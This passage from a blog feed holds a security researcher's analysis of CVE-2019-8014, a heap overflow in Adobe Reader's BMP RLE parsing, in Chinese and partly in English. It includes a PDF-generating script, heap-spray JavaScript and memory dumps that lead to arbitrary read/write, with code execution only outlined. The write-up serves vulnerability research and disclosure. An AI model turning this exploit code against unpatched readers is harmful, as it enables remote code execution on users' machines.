pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="5-5-利用技巧"><a href="#5-5-利用技巧" class="headerlink" title="5.5 利用技巧"></a>5.5 利用技巧</h3><h4 id="5-5-1-内存布局-1"><a href="#5-5-1-内存布局-1" class="headerlink" title="5.5.1 内存布局 (1)"></a>5.5.1 内存布局 (1)</h4><p>这里借助 <code>ArrayBuffer</code> 来完成内存布局。</p><p>因为位图解析过程中创建的堆块大小为 <code>0xF0</code> 字节，因此 <code>ArrayBuffer</code> 的 <code>byteLength</code> 可以设置为 <code>0xE0</code> 。为了创建内存空洞，可以先创建大量的 <code>ArrayBuffer</code> 对象，然后间隔释放其中的一半对象，理想情况下的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure><p>在触发漏洞时，位图解析相关的堆块会落到其中一个空洞上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure><p>因为可以向低地址方向越界写 <code>0xF4</code> 字节的 <code>0x10</code> 数据，所以触发漏洞之后，<code>ArrayBuffer</code> 对象的 <strong>backing store</strong> 的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer 数据</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer 结束</span><br><span class="line">; 下一个堆块的元数据（存储位图数据的堆块）</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; 位图数据</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>此时 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成了 <code>0x10101010</code> ，但是 <code>DataView</code> 对象的指针也被改成了 <code>0x10101010</code> ，前面提到过这会导致进程崩溃。</p><h4 id="5-5-2-内存布局-0"><a href="#5-5-2-内存布局-0" class="headerlink" title="5.5.2 内存布局 (0)"></a>5.5.2 内存布局 (0)</h4><p>为了避免进程崩溃，需要提前在地址 <code>0x10101010</code> 上布局数据，让这个地址看起来就是一个 <code>DataView</code> 指针。很明显，为了漏洞利用更加稳定，我们需要一开始就在这里布局好数据。</p><p>同样，这里借助 <code>ArrayBuffer</code> 实现精确的内存布局：</p><ul><li>创建大量 <code>byteLength</code> 为 <code>0xFFE8</code> 的 <code>ArrayBuffer</code> </li><li>在特定内存范围内，<code>ArrayBuffer</code> 的 <strong>backing store</strong> 将有序的出现在地址 <code>0xYYYY0048</code> 上</li></ul><p>之所以选择 <code>0xFFE8</code> ，是因为这会使得 <strong>backing store</strong> 所在堆块整体的大小为 <code>0x10000</code> ：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>使用下面的代码进行内存布局，可以有效防止进程崩溃（具体细节不作讲解，相关条件很容易通过动态调试分析出来）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这仅仅只能防止漏洞触发后进程的崩溃，如果要为该 <code>ArrayBuffer</code> 关联新的 <code>DataView</code> 来读写数据，那么会导致新的崩溃。同样，填充一点新的数据就可以防止进程崩溃，新的代码如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 防止触发漏洞之后进程立刻 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 防止关联 DataView 对象时 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-5-3-全局读写"><a href="#5-5-3-全局读写" class="headerlink" title="5.5.3 全局读写"></a>5.5.3 全局读写</h4><p>当 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成 <code>0x10101010</code> 之后，可以基于这个 <code>ArrayBuffer</code> 对象修改下一个 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 。在基于 <code>ArrayBuffer</code> 创建内存空洞时，可以在每一个 <code>ArrayBuffer</code> 上存储特定的标记值，这样在内存中搜索 <code>ArrayBuffer</code> 对象就非常简单了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>当下一个 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成 <code>0xFFFFFFFF</code> 时，基于这个 <code>ArrayBuffer</code> 对象就可以实现用户态空间的全局读写了。</p><h4 id="5-5-4-任意地址读写"><a href="#5-5-4-任意地址读写" class="headerlink" title="5.5.4 任意地址读写"></a>5.5.4 任意地址读写</h4><p>一旦拥有全局读写的能力，我们就可以向低地址方向来搜索特定的关键字来定位 <code>ArrayBuffer</code> 对象在内存中的绝对地址，然后基于这个绝对地址来实现任意地址读写。</p><p>这里可以通过搜索 <code>ffeeffee</code> 或者 <code>f0e0d0c0</code> 来定位，为了提高准确性，需要同时校验关键字附近的数据的取值范围。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="5-5-5-剩余步骤"><a href="#5-5-5-剩余步骤" class="headerlink" title="5.5.5 剩余步骤"></a>5.5.5 剩余步骤</h4><p>在拥有任意地址读写能力之后，实现代码执行就是固定的套路了，本文对此不做详细介绍。</p><p>剩余的步骤如下：</p><ul><li>EIP 劫持</li><li>ASLR 绕过</li><li>DEP 绕过</li><li>CFG 绕过</li></ul><h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>前面提到一共找到了三处整数溢出，其中一处位于 RLE8 数据解析过程中，另外两处位于 RLE4 数据解析过程中。难道不应该有四个位置存在整数溢出吗？为什么只找到了三个？</p><p>因为有一个在六年前已经修复了（参考 <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a>）！从版本 <code>2019.012.20035</code> 中的代码也可以看到，确实有一个地方判断了整数溢出的情况，这就是 CVE-2013-2729 引入的补丁。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>然而 Adobe 仅仅修补了报告的这一个位置，而忽略了其他三个位置上的整数溢出。</p><h2 id="0x07-经验教训"><a href="#0x07-经验教训" class="headerlink" title="0x07. 经验教训"></a>0x07. 经验教训</h2><p>对厂商而言，在深入理解漏洞本质的同时，还可以看看是不是有类似的问题需要修复。</p><p>对安全研究人员而言，分析完漏洞之后还可以顺便看一下厂商的修复方式，也许不经意间就能发现新的漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前 &lt;strong&gt;&lt;del&gt;修复&lt;/del&gt;&lt;/strong&gt; 了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;本文作者：&lt;strong&gt;Ke Liu of Tencent Security Xuanwu Lab&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01. 漏洞简介&quot;&gt;&lt;/a&gt;0x01. 漏洞简介&lt;/h2&gt;&lt;p&gt;Adobe 在八月份为 Adobe Acrobat and Reader 发布了安全公告 &lt;a href=&quot;https://helpx.adobe.com/security/products/acrobat/apsb19-41.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;APSB19-41&lt;/a&gt; ，和往常一样，这次更新修复了大量漏洞。当笔者在 &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/published/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ZDI&lt;/a&gt; 上查看对应的漏洞公告时，目光迅速被 &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-19-725/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ZDI-19-725&lt;/a&gt; / &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CVE-2019-8014&lt;/a&gt; 所吸引，因为模块 &lt;code&gt;AcroForm&lt;/code&gt; 中 Bitmap 解析相关的漏洞非常少见。该漏洞在 ZDI 上的部分公告信息如下：&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
      <category term="CVE-2019-8014" scheme="http://programlife.net/tags/CVE-2019-8014/"/>
    
      <category term="CVE-2013-2729" scheme="http://programlife.net/tags/CVE-2013-2729/"/>
    
      <category term="XFA" scheme="http://programlife.net/tags/XFA/"/>
    
      <category term="BMP" scheme="http://programlife.net/tags/BMP/"/>
    
      <category term="RLE" scheme="http://programlife.net/tags/RLE/"/>
    
  </entry>
  
  <entry>
    <title>Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago</title>
    <link href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/"/>
    <id>http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/</id>
    <published>2019-09-12T00:13:37.000Z</published>
    <updated>2019-09-12T13:03:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was <del><strong>fixed</strong></del> six years ago. This post also discusses how to exploit the vulnerability.</em></p><p>Author: <strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h2><p>Adobe released security updates for Adobe Acrobat and Reader in <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> in August. As usual, lots of vulnerabilities were fixed in the updates. When I was reviewing the corresponding advisories on <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> , my attention was attracted by one of them: <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> . Following text is the title and description of this case:</p><a id="more"></a><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p><p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><p>What surprised me most is that the flaw exists within the parsing of run length encoding in BMP images because I remembered that six years ago a similar case <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> was fixed in Adobe Reader. If you have the same wondering that what’s the relationship between CVE-2013-2729 and CVE-2019-8014, then let me reveal the truth for you.</p><p>By the way, the credit of CVE-2019-8014 goes to <code>ktkitty (https://ktkitty.github.io)</code> .</p><h2 id="0x02-Debugging-Environment"><a href="#0x02-Debugging-Environment" class="headerlink" title="0x02. Debugging Environment"></a>0x02. Debugging Environment</h2><p>Before diving deep into the details of the vulnerability, let’s set up the debugging environment first. According to <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> , <code>2019.012.20035</code> and earlier versions of Adobe Acrobat and Reader on Windows were affected, and the released version was <code>2019.012.20036</code> . We’ll carry out our analysis on these two versions.</p><p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20035</code> :</p><ol><li>Download and install <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">Download Link</a>)</li><li>Upgrade to <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">Download Link</a>)</li></ol><p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20036</code> :</p><ol><li>Download and install <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">Download Link</a>)</li></ol><p>Please remember to disconnect the Internet or disable the <em>Adobe Acrobat Update Service</em> , otherwise your Adobe Acrobat Reader DC will be updated automatically.</p><h2 id="0x03-Bitmap-Structures"><a href="#0x03-Bitmap-Structures" class="headerlink" title="0x03. Bitmap Structures"></a>0x03. Bitmap Structures</h2><p>Again, before diving deep into the details of the vulnerability, let’s learn some essential concepts of bitmap images. You can skip this section if you’re already familiar with it.</p><h3 id="3-1-Structures"><a href="#3-1-Structures" class="headerlink" title="3.1 Structures"></a>3.1 Structures</h3><p>Generally speaking, a bitmap image is composed of four parts:</p><ol><li>Bitmap File Header</li><li>Bitmap Info Header</li><li>RGBQUAD Array</li><li>Bitmap Data</li></ol><h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> structure contains information about the type, size, and layout of the bitmap file. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// size of the bitmap file</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// offset of the bitmap bits</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> structure contains information about the dimensions and color format of the bitmap file. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// sizeof(BITMAPINFOHEADER)</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// bitmap width</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// bitmap height</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// must be 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// bits per pixel</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// compression method</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// size of bitmap bits</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// horizontal resolution, pixels-per-meter</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// vertical resolution, pixels-per-meter</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// number of color indexes in the color table</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// number of color indexes that are required</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><p>The value of <code>biCompression</code> represents the compression method of the bitmap. Following are some of the possible values of it:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// uncompressed format</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// run-length encoded (RLE) format with 8 bpp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// run-length encoded (RLE) format with 4 bpp</span></span></span><br><span class="line"><span class="comment">// other compression methods...</span></span><br></pre></td></tr></table></figure><h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> structure describes a color consisting of relative intensities of red, green, and blue. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><p>The elements of the RGBQUAD array make up the color table. The number of entries in the array depends on the values of the <code>biBitCount</code> and <code>biClrUsed</code> members of the <strong>BITMAPINFOHEADER</strong> structure.</p><h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>Bits data of the bitmap. The layout of this section depends on the compression method of the bitmap.</p><p>One thing should be noted is that usually pixels are stored “bottom-up”, starting in the lower left corner, going from left to right, and then row by row from the bottom to the top of the image [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)].</p><h3 